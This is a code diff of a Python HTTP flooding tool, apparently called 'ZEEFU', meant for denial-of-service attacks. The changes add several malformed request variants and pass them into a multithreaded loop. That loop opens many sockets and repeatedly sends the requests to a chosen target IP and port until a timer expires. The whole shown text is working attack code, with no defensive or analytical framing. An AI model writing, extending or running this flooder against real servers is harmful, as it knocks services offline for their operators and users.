@@ -1,4 +1,3 @@
-# -*- coding: utf-8 -*-
 # CHECK IMPORT
 try:
     import socket
@@ -23,37 +22,21 @@ def clear_text():
         os.system('clear')
 
 def status_print(ip,port,thread_id,rps,path_get):
-    print(f"{Fore.YELLOW} ZEEFU {Fore.GREEN} FL00DING HTTP {Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.WHITE}={path_get} {Fore.CYAN}RPS{Fore.WHITE}={rps} {Fore.LIGHTCYAN_EX}ID{Fore.WHITE}={thread_id}{Fore.RESET}")
+    print(f"{Fore.GREEN}ZEEFU {Fore.LIGHTYELLOW_EX}FL00DING {Fore.YELLOW}HTTP{Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.LIGHTBLUE_EX}PATH{Fore.WHITE}={path_get} {Fore.CYAN}RPS{Fore.WHITE}={rps} {Fore.LIGHTCYAN_EX}ID{Fore.WHITE}={thread_id}{Fore.RESET}")
 def generate_url_path_pyflooder(num):
     msg = str(string.ascii_letters + string.digits + string.punctuation)
     data = "".join(random.sample(msg, int(num)))
     return data
     
 def generate_url_path_choice(num):
+    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
     data = ""
     for _ in range(int(num)):
         data += random.choice(letter)
     return data
 
-def clear_text():
-    if platform.system().upper() == "WINDOWS":
-        os.system('cls')
-    else:
-        os.system('clear')
-
-def generate_url_path_pyflooder(num):
-    msg = str(string.ascii_letters + string.digits + string.punctuation)
-    data = "".join(random.sample(msg, int(num)))
-    return data
-    
-def generate_url_path_choice(num): 
-    data = ""
-    for _ in range(int(num)):
-        data += random.choice(letter)
-    return data
-    
 # DOS
-def DoS_Attack(ip,host,port,type_attack,id,booter_sent):
+def DoS_Attack(ip,host,port,type_attack,id,booter_sent,data_type_loader_packet):
     rps = 0
     url_path = ''
     path_get = ['PY_FLOOD','CHOICES_FLOOD']
@@ -64,7 +47,18 @@ def DoS_Attack(ip,host,port,type_attack,id,booter_sent):
         url_path = generate_url_path_choice(5)
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     try:
-        packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n".encode()
+        if data_type_loader_packet == 'PY' or data_type_loader_packet == 'PYF':
+            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n".encode()
+        elif data_type_loader_packet == 'OWN1':
+            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\r\r".encode()
+        elif data_type_loader_packet == 'OWN2':
+            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\r\r\n\n".encode()
+        elif data_type_loader_packet == 'OWN3':
+            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n".encode()
+        elif data_type_loader_packet == 'OWN4':
+            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n".encode()
+        elif data_type_loader_packet == 'OWN5':
+            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n\r\r\r\r".encode()
         s.connect((ip,port))
         for _ in range(booter_sent):
             s.sendall(packet_data)
@@ -80,25 +74,24 @@ def DoS_Attack(ip,host,port,type_attack,id,booter_sent):
 
 status_code = False
 id_loader = 0
-def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent):
+def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet):
     global status_code,id_loader
     if status_code == True:
         while time.time() < time_loader:
             for _ in range(spam_loader):
                 id_loader += 1
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
                 th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
                 th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
                 th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
                 th.start()
-                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
+                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent,data_type_loader_packet))
                 th.start()
     else:
-        threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
-
+        threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet)).start()
 #DATA
 banner = f"""
 {Fore.BLUE}████████▒▒ ██▒▒        ████▒▒     ███▒▒  ██████▒▒
